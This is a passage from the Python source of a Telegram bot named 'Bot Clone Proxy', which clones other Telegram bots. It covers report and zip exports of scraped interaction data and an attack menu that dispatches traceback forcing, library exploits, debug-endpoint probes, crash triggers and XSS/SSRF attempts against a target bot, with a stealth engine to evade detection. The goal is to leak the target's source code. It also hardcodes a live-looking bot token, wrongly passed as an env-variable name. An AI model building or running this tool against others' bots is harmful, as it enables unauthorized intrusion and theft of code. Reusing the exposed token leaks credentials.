        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }}
        h1 {{ color: #333; border-bottom: 2px solid #4CAF50; padding-bottom: 10px; }}
        h2 {{ color: #666; margin-top: 30px; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }}
        .stat-card {{ background: #f9f9f9; padding: 20px; border-radius: 8px; text-align: center; }}
        .stat-card h3 {{ margin: 0; color: #4CAF50; }}
        .stat-card p {{ font-size: 24px; font-weight: bold; margin: 10px 0; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background-color: #4CAF50; color: white; }}
        tr:hover {{ background-color: #f5f5f5; }}
        .pattern {{ background: #e3f2fd; padding: 5px 10px; border-radius: 15px; display: inline-block; margin: 2px; }}
        .code {{ background: #2d2d2d; color: #f8f8f8; padding: 15px; border-radius: 5px; overflow-x: auto; font-family: monospace; }}
        .warning {{ background: #fff3cd; color: #856404; padding: 15px; border-radius: 5px; margin: 20px 0; }}
        .footer {{ margin-top: 40px; text-align: center; color: #999; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🤖 Bot Clone Report: @{bot_info['username']}</h1>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        
        <div class="warning">
            <strong>⚠️ LEGAL NOTICE:</strong> This report is for authorized testing only.
            Unauthorized use is illegal.
        </div>
        
        <h2>📊 Overview</h2>
        <div class="stats">
            <div class="stat-card">
                <h3>Interactions</h3>
                <p>{bot_info['total_interactions']}</p>
            </div>
            <div class="stat-card">
                <h3>States</h3>
                <p>{fsm_data.get('state_count', 0)}</p>
            </div>
            <div class="stat-card">
                <h3>Patterns</h3>
                <p>{len(stats.get('pattern_stats', {}))}</p>
            </div>
            <div class="stat-card">
                <h3>Fragments</h3>
                <p>{stats.get('code_fragments', 0)}</p>
            </div>
        </div>
        
        <h2>📈 Statistics</h2>
        <table>
            <tr>
                <th>Metric</th>
                <th>Value</th>
            </tr>
            <tr>
                <td>Success Rate</td>
                <td>{bot_info.get('success_rate', 0)*100:.1f}%</td>
            </tr>
            <tr>
                <td>Avg Response Time</td>
                <td>{stats.get('avg_response', 0):.2f}s</td>
            </tr>
            <tr>
                <td>Button Flows</td>
                <td>{stats.get('flow_stats', {}).get('total_flows', 0)}</td>
            </tr>
            <tr>
                <td>Complexity Score</td>
                <td>{fsm_data.get('complexity_score', 0)}</td>
            </tr>
        </table>
        
        <h2>🔍 Detected Patterns</h2>
        <table>
            <tr>
                <th>Pattern Type</th>
                <th>Count</th>
                <th>Sample</th>
            </tr>"""
        
        # Add patterns
        cursor = db.execute("SELECT * FROM patterns WHERE target_bot_id = ?", (bot_id,))
        for row in cursor.fetchall():
            html += f"""
            <tr>
                <td><span class="pattern">{row['pattern_type']}</span></td>
                <td>{row['occurrences']}</td>
                <td><code>{row['sample_value']}</code></td>
            </tr>"""
        
        html += """
        </table>
        
        <h2>🔧 Reconstructed States</h2>
        <table>
            <tr>
                <th>State</th>
                <th>Buttons</th>
                <th>Transitions</th>
            </tr>"""
        
        # Add states
        for state_name, state in reconstructor.states.items():
            html += f"""
            <tr>
                <td><strong>{state_name}</strong></td>
                <td>{len(state.buttons)}</td>
                <td>{len(state.child_states)}</td>
            </tr>"""
        
        html += """
        </table>
        
        <h2>📝 Code Fragments</h2>"""
        
        # Add code fragments
        cursor = db.execute("SELECT * FROM code_fragments WHERE target_bot_id = ? ORDER BY confidence DESC", (bot_id,))
        fragments = cursor.fetchall()
        
        if fragments:
            for frag in fragments[:5]:
                html += f"""
        <div class="code">
            <strong>{frag['fragment_type']}</strong> (confidence: {frag['confidence']})<br>
            {frag['content'][:500]}{'...' if len(frag['content']) > 500 else ''}
        </div>"""
        else:
            html += "<p>No code fragments recovered.</p>"
        
        html += f"""
        <h2>📋 Export Details</h2>
        <p>
            <strong>Bot ID:</strong> {bot_id}<br>
            <strong>Tool Version:</strong> {VERSION}<br>
            <strong>Export Format:</strong> HTML Report<br>
            <strong>Total Records:</strong> {bot_info['total_interactions']} interactions
        </p>
        
        <div class="footer">
            Bot Clone Proxy v{VERSION} - For authorized testing only
        </div>
    </div>
</body>
</html>"""
        
        # Save HTML
        filename = f"report_{bot_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        filepath = EXPORTS_DIR / filename
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html)
        
        # Send file
        await callback.message.answer_document(
            FSInputFile(filepath),
            caption=f"✅ Comprehensive HTML report for @{user_data.get('selected_bot_username')}"
        )
        
    except Exception as e:
        logger.error(f"Report export error: {e}", exc_info=True)
        await callback.message.answer(f"❌ Report generation failed: {str(e)}")

@router.callback_query(F.data == "export_all")
async def export_all(callback: CallbackQuery, state: FSMContext):
    """Export all data in a zip file"""
    user_data = await state.get_data()
    bot_id = user_data.get("selected_bot_id")
    
    if not bot_id:
        await callback.answer("Please select a bot first", show_alert=True)
        return
    
    await callback.answer("⏳ Creating complete export package...", show_alert=False)
    
    try:
        bot_info = db.get_target_bot(bot_id)
        username = bot_info['username']
        
        # Create zip in memory
        zip_buffer = BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            
            # Add JSON export
            cursor = db.execute("SELECT * FROM interactions WHERE target_bot_id = ?", (bot_id,))
            interactions = [dict(row) for row in cursor.fetchall()]
            
            cursor = db.execute("SELECT * FROM button_flows WHERE target_bot_id = ?", (bot_id,))
            flows = [dict(row) for row in cursor.fetchall()]
            
            cursor = db.execute("SELECT * FROM patterns WHERE target_bot_id = ?", (bot_id,))
            patterns = [dict(row) for row in cursor.fetchall()]
            
            cursor = db.execute("SELECT * FROM code_fragments WHERE target_bot_id = ?", (bot_id,))
            fragments = [dict(row) for row in cursor.fetchall()]
            
            export_data = {
                "export_time": datetime.now().isoformat(),
                "version": VERSION,
                "bot": dict(bot_info) if bot_info else {},
                "statistics": db.get_bot_statistics(bot_id),
                "interactions": interactions,
                "button_flows": flows,
                "patterns": patterns,
                "code_fragments": fragments
            }
            
            zip_file.writestr("data.json", json.dumps(export_data, indent=2, default=str))
            
            # Add Mermaid diagram
            reconstructor = StateMachineReconstructor(bot_id)
            await reconstructor.rebuild_from_history()
            diagram = reconstructor.generate_mermaid_diagram()
            zip_file.writestr("flow.mmd", diagram)
            
            # Add Python stubs
            stubs = reconstructor.generate_python_stubs()
            zip_file.writestr("stubs.py", stubs)
            
            # Add README
            readme = f"""Bot Clone Export Package
========================
Bot: @{username}
Bot ID: {bot_id}
Export Date: {datetime.now().isoformat()}
Tool Version: {VERSION}

Contents:
- data.json: Raw interaction data
- flow.mmd: Mermaid flow diagram
- stubs.py: Python code stubs

LEGAL NOTICE: This data is for authorized testing only.
"""
            zip_file.writestr("README.txt", readme)
        
        # Send zip
        zip_buffer.seek(0)
        filename = f"export_all_{bot_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        
        await callback.message.answer_document(
            BufferedInputFile(zip_buffer.getvalue(), filename=filename),
            caption=f"✅ Complete export package for @{username}"
        )
        
    except Exception as e:
        logger.error(f"Export all error: {e}", exc_info=True)
        await callback.message.answer(f"❌ Export failed: {str(e)}")

@router.callback_query(F.data == "export_list")
async def list_exports(callback: CallbackQuery):
    """List available export files"""
    
    exports = list(EXPORTS_DIR.glob("*.*"))
    exports.sort(key=lambda x: x.stat().st_mtime, reverse=True)
    
    if not exports:
        text = "📭 <b>No exports found</b>\n\nGenerate exports first."
    else:
        text = "📁 <b>Recent Exports</b>\n\n"
        for export in exports[:10]:
            size = export.stat().st_size
            size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/1024/1024:.1f} MB"
            mtime = datetime.fromtimestamp(export.stat().st_mtime).strftime('%Y-%m-%d %H:%M')
            text += f"• <code>{export.name}</code>\n"
            text += f"  ├ Size: {size_str}\n"
            text += f"  └ Date: {mtime}\n\n"
    
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="🔙 Export Menu", callback_data="menu_export"),
        InlineKeyboardButton(text="🏠 Main", callback_data="menu_main")
    )
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@router.callback_query(F.data.startswith("export_bot_"))
async def export_bot_specific(callback: CallbackQuery, state: FSMContext):
    """Export data for specific bot"""
    bot_id = int(callback.data.split("_")[2])
    
    # Get bot info
    bot_info = db.get_target_bot(bot_id)
    if not bot_info:
        await callback.answer("Bot not found!", show_alert=True)
        return
    
    # Store selected bot
    await state.update_data(selected_bot_id=bot_id, selected_bot_username=bot_info['username'])
    
    # Show export menu
    await export_menu(callback, state)

@router.callback_query(F.data == "menu_attack_vectors")
async def attack_vector_menu(callback: CallbackQuery, state: FSMContext):
    """Show attack vector menu"""
    user_data = await state.get_data()
    bot_id = user_data.get("selected_bot_id")
    
    if not bot_id:
        await callback.answer("Please select a bot first", show_alert=True)
        return
    
    bot_info = db.get_target_bot(bot_id)
    
    await state.set_state(CloneStates.attack_vector_selection)
    
    warning_text = (
        f"🔥 <b>ATTACK VECTOR MENU</b>\n\n"
        f"<b>Target:</b> @{bot_info['username']}\n\n"
        f"<b>⚠️ CRITICAL WARNING:</b>\n"
        f"• These vectors attempt to force code leakage\n"
        f"• Success rate in 2026 is <b>&lt;0.1%</b>\n"
        f"• Most vectors are patched\n"
        f"• May trigger rate limiting\n"
        f"• Could get your account banned\n\n"
        f"<b>Available Vectors:</b>\n"
        f"• 🐍 Python Traceback - Force error messages\n"
        f"• 📚 Library Exploits - Known vuln patterns\n"
        f"• 🔍 Probe Commands - Debug endpoints\n"
        f"• 💥 Crash Triggers - Attempt to crash\n"
        f"• 🌐 WebApp Exploits - XSS/SSRF attempts\n\n"
        f"<i>Select vector to execute:</i>"
    )
    
    await callback.message.edit_text(
        warning_text,
        parse_mode="HTML",
        reply_markup=UIComponents.attack_vector_menu()
    )
    await callback.answer()

@router.callback_query(F.data.startswith("attack_"), CloneStates.attack_vector_selection)
async def execute_attack_vector(callback: CallbackQuery, state: FSMContext, bot: Bot):
    """Execute selected attack vector"""
    vector = callback.data.replace("attack_", "")
    user_data = await state.get_data()
    bot_id = user_data.get("selected_bot_id")
    
    if not bot_id:
        await callback.answer("No bot selected!", show_alert=True)
        return
    
    bot_info = db.get_target_bot(bot_id)
    username = bot_info['username']
    
    await state.set_state(CloneStates.monitoring_attack)
    
    # Create progress message
    progress_msg = await callback.message.edit_text(
        f"🔥 <b>Executing Attack Vector: {vector.upper()}</b>\n\n"
        f"<b>Target:</b> @{username}\n"
        f"<b>Status:</b> 🟡 Initializing...\n\n"
        f"This may take several minutes.\n"
        f"Results will appear in database.",
        parse_mode="HTML"
    )
    
    # Initialize attack engine
    engine = AttackVectorEngine(bot_id, username)
    stealth = user_stealth_engines.get(callback.from_user.id, StealthEngine(callback.from_user.id, "balanced"))
    
    try:
        # Execute appropriate vector
        if vector == "traceback":
            results = await engine.force_tracebacks(bot, callback.message, stealth)
            status = f"Traceback forcing complete - {len(results)} attempts"
        elif vector == "library":
            results = await engine.library_exploits(bot, callback.message, stealth)
            status = f"Library exploit attempts complete - {len(results)} vectors"
        elif vector == "probe":
            results = await engine.probe_debug_commands(bot, callback.message, stealth)
            status = "Debug command probing complete"
        elif vector == "crash":
            results = await engine.trigger_crashes(bot, callback.message, stealth)
            status = f"Crash triggers complete - {len(results)} attempts"
        elif vector == "webapp":
            results = await engine.webapp_exploits(bot, callback.message, stealth)
            status = f"WebApp exploits complete - {len(results)} attempts"
        elif vector == "all":
            results = await engine.execute_all_vectors(bot, callback.message, stealth)
            status = "All vectors executed"
        else:
            status = "Unknown vector"
        
        # Check for any fragments
        cursor = db.execute(
            "SELECT COUNT(*) FROM code_fragments WHERE target_bot_id = ? AND timestamp > datetime('now', '-1 hour')",
            (bot_id,)
        )
        row = cursor.fetchone()
        fragment_count = row[0] if row else 0
        
        # Update progress
        await progress_msg.edit_text(
            f"🔥 <b>Attack Vector Complete</b>\n\n"
            f"<b>Target:</b> @{username}\n"
            f"<b>Vector:</b> {vector}\n"
            f"<b>Status:</b> ✅ {status}\n\n"
            f"<b>Fragments recovered (last hour):</b> {fragment_count}\n\n"
            f"Check 'View Leaks' in main menu for details.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardBuilder().row(
                InlineKeyboardButton(text="🔙 Attack Menu", callback_data="menu_attack_vectors"),
                InlineKeyboardButton(text="🏠 Main", callback_data="menu_main")
            ).as_markup()
        )
        
    except Exception as e:
        logger.error(f"Attack vector error: {e}", exc_info=True)
        await progress_msg.edit_text(
            f"❌ <b>Attack Vector Failed</b>\n\n"
            f"<b>Error:</b> <code>{str(e)[:200]}</code>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardBuilder().row(
                InlineKeyboardButton(text="🔙 Attack Menu", callback_data="menu_attack_vectors")
            ).as_markup()
        )
    
    await state.set_state(CloneStates.main_menu)
    await callback.answer()

@router.callback_query(F.data == "menu_view_leaks")
async def view_leaks_menu(callback: CallbackQuery, state: FSMContext):
    """View recovered code fragments"""
    user_data = await state.get_data()
    bot_id = user_data.get("selected_bot_id")
    
    # Get fragments
    if bot_id:
        cursor = db.execute(
            "SELECT * FROM code_fragments WHERE target_bot_id = ? ORDER BY confidence DESC, timestamp DESC LIMIT 20",
            (bot_id,)
        )
    else:
        cursor = db.execute(
            "SELECT * FROM code_fragments ORDER BY timestamp DESC LIMIT 20"
        )
    
    fragments = cursor.fetchall()
    
    if not fragments:
        text = "🔍 <b>No Code Fragments Found</b>\n\n"
        text += "Try running attack vectors against a target bot.\n"
        text += "Note: Success rate is extremely low in 2026."
    else:
        text = f"🔍 <b>Recovered Code Fragments ({len(fragments)})</b>\n\n"
        
        for frag in fragments[:5]:
            text += f"<b>Type:</b> {frag['fragment_type']}\n"
            text += f"<b>Confidence:</b> {frag['confidence']:.1%}\n"
            text += f"<b>Source:</b> {frag['source_vector']}\n"
            text += f"<b>Content:</b>\n<code>{frag['content'][:200]}{'...' if len(frag['content']) > 200 else ''}</code>\n\n"
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=UIComponents.leaks_menu(bot_id)
    )
    await callback.answer()

@router.callback_query(F.data.startswith("leaks_"))
async def handle_leaks_filter(callback: CallbackQuery, state: FSMContext):
    """Filter leaks by type"""
    filter_type = callback.data.split("_")[1]
    user_data = await state.get_data()
    bot_id = user_data.get("selected_bot_id")
    
    # Map filter to fragment_type
    type_map = {
        "tracebacks": "traceback",
        "paths": "file_path",
        "snippets": "code_snippet",
        "all": None
    }
    
    frag_type = type_map.get(filter_type)
    
    query = "SELECT * FROM code_fragments"
    params = []
    
    if bot_id:
        query += " WHERE target_bot_id = ?"
        params.append(bot_id)
        
        if frag_type:
            query += f" AND fragment_type = ?"
            params.append(frag_type)
    elif frag_type:
        query += " WHERE fragment_type = ?"
        params.append(frag_type)
    
    query += " ORDER BY confidence DESC, timestamp DESC LIMIT 20"
    
    cursor = db.execute(query, tuple(params))
    fragments = cursor.fetchall()
    
    if not fragments:
        text = f"📭 <b>No {filter_type} fragments found</b>"
    else:
        text = f"📄 <b>{filter_type.title()} Fragments ({len(fragments)})</b>\n\n"
        
        for frag in fragments[:5]:
            text += f"<b>Type:</b> {frag['fragment_type']}\n"
            text += f"<b>Confidence:</b> {frag['confidence']:.1%}\n"
            if frag['file_path']:
                text += f"<b>File:</b> {frag['file_path']}:{frag['line_number']}\n"
            text += f"<code>{frag['content'][:150]}{'...' if len(frag['content']) > 150 else ''}</code>\n\n"
    
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="🔙 Back to Leaks", callback_data="menu_view_leaks"),
        InlineKeyboardButton(text="🏠 Main", callback_data="menu_main")
    )
    
    await callback.message.edit_text(
        text,
        parse_mode="HTML",
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@router.callback_query(F.data.startswith("leaks_bot_"))
async def view_bot_leaks(callback: CallbackQuery, state: FSMContext):
    """View leaks for specific bot"""
    bot_id = int(callback.data.split("_")[2])
    await state.update_data(selected_bot_id=bot_id)
    await view_leaks_menu(callback, state)

@router.callback_query(F.data == "settings_clear_cache")
async def clear_cache(callback: CallbackQuery):
    """Clear media and temporary cache"""
    try:
        # Clear media cache table
        db.execute("DELETE FROM media_cache")
        
        # Clear old exports
        for file in EXPORTS_DIR.glob("*"):
            if file.stat().st_mtime < (time.time() - 86400):
                file.unlink()
        
        # Clear old logs
        for file in LOGS_DIR.glob("*.log"):
            if file.stat().st_mtime < (time.time() - 604800):
                file.unlink()
        
        db.commit()
        await callback.answer("✅ Cache cleared successfully")
        
    except Exception as e:
        logger.error(f"Cache clear error: {e}")
        await callback.answer(f"❌ Error clearing cache: {str(e)[:50]}", show_alert=True)

@router.callback_query(F.data == "settings_reset_stats")
async def reset_stats(callback: CallbackQuery, state: FSMContext):
    """Reset statistics (confirmation required)"""
    await state.set_state(CloneStates.confirming_action)
    
    await callback.message.edit_text(
        "⚠️ <b>Reset Statistics</b>\n\n"
        "This will delete ALL interaction data and statistics.\n"
        "Bot targets and settings will be preserved.\n\n"
        "Are you absolutely sure?",
        parse_mode="HTML",
        reply_markup=InlineKeyboardBuilder().row(
            InlineKeyboardButton(text="✅ YES, RESET ALL", callback_data="confirm_reset_stats"),
            InlineKeyboardButton(text="❌ Cancel", callback_data="menu_settings")
        ).as_markup()
    )
    await callback.answer()

@router.callback_query(F.data == "confirm_reset_stats")
async def confirm_reset_stats(callback: CallbackQuery, state: FSMContext):
    """Confirm statistics reset"""
    try:
        # Clear interactions
        db.execute("DELETE FROM interactions")
        
        # Clear button flows
        db.execute("DELETE FROM button_flows")
        
        # Clear patterns
        db.execute("DELETE FROM patterns")
        
        # Clear timing patterns
        db.execute("DELETE FROM timing_patterns")
        
        # Clear code fragments
        db.execute("DELETE FROM code_fragments")
        
        # Reset bot stats
        db.execute("UPDATE target_bots SET total_interactions = 0, success_rate = 0, avg_response_time = 0")
        
        db.commit()
        
        await callback.answer("✅ All statistics reset successfully")
        await settings_menu(callback, state)
        
    except Exception as e:
        logger.error(f"Reset stats error: {e}")
        await callback.answer(f"❌ Error: {str(e)[:50]}", show_alert=True)

@router.message()
async def handle_unknown(message: types.Message, state: FSMContext):
    """Handle unknown messages"""
    current_state = await state.get_state()
    
    if current_state == CloneStates.adding_target:
        return
    
    await message.answer(
        "❓ <b>Unknown command</b>\n\n"
        "Please use the inline keyboard menu.",
        parse_mode="HTML",
        reply_markup=UIComponents.main_menu()
    )

# ============================================================================
# ERROR HANDLERS
# ============================================================================

@router.errors()
async def error_handler(event: types.ErrorEvent):
    """Global error handler"""
    logger.error(f"Bot error: {event.exception}", exc_info=True)
    
    try:
        if event.update.message:
            await event.update.message.answer(
                "❌ <b>An internal error occurred</b>\n\n"
                "Please try again later.",
                parse_mode="HTML"
            )
        elif event.update.callback_query:
            await event.update.callback_query.answer(
                "An error occurred. Please try again.",
                show_alert=True
            )
    except Exception as e:
        logger.error(f"Error in error handler: {e}")

# ============================================================================
# MAIN FUNCTION
# ============================================================================

async def on_startup():
    """Startup tasks"""
    logger.info(f"🚀 Starting Bot Clone Proxy v{VERSION}")
    logger.info(f"📁 Data directory: {CONFIG_DIR.absolute()}")
    logger.info(f"🗄️ Database: {DB_PATH}")
    
    # Ensure database is initialized
    db._create_tables()
    
    logger.info("✅ Bot initialized successfully")

async def on_shutdown():
    """Shutdown tasks"""
    logger.info("🛑 Shutting down...")
    
    # End any active sessions
    for user_id, session in list(active_sessions.items()):
        try:
            db.end_session(session["session_uuid"])
            duration = datetime.now() - session["start_time"]
            logger.info(f"Session {session['session_uuid']} ended. Duration: {duration}, Interactions: {session['interactions']}")
        except Exception as e:
            logger.error(f"Error ending session: {e}")
    
    active_sessions.clear()
    
    # Close database connections
    db.close_all()
    
    logger.info("👋 Goodbye!")

def main():
    """Main entry point"""
    
    # Get token from environment
    token = os.environ.get("BOT_TOKEN")
    if not token:
        # Try to load from .env file
        try:
            from dotenv import load_dotenv
            load_dotenv()  # This loads the .env file
            token = os.environ.get("8653501255:AAGOwfrDxKYa3aHxWAu_FA915SAPtlotqhw")  # ← CORRECTED: Get the token from env after loading .env
        except ImportError:
            pass
    
    if not token:
        print("\n" + "="*60)
        print("❌ ERROR: BOT_TOKEN environment variable not set")
        print("="*60)
        print("\nPlease set your bot token:")
        print("  export BOT_TOKEN='YOUR_TOKEN_HERE'")
        print("\nOr create a .env file with:")
        print("  BOT_TOKEN=your_bot_token_here")
        print("="*60)
        sys.exit(1)

    # Initialize bot
    bot = Bot(
        token=token,
        default=DefaultBotProperties(parse_mode=ParseMode.HTML)
    )
    
    # Include router
    dp.include_router(router)
    
    # Register startup/shutdown
    dp.startup.register(on_startup)
    dp.shutdown.register(on_shutdown)
    
    # Handle signals
    def signal_handler(sig, frame):
        logger.info(f"Received signal {sig}, shutting down...")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Start polling
    try:
        logger.info("🔄 Starting polling...")
        dp.run_polling(bot)
    except KeyboardInterrupt:
        logger.info("📴 Received keyboard interrupt")
    except Exception as e:
        logger.error(f"💥 Fatal error: {e}", exc_info=True)
    finally:
        logger.info("🏁 Bot stopped")

if __name__ == "__main__":
    main()
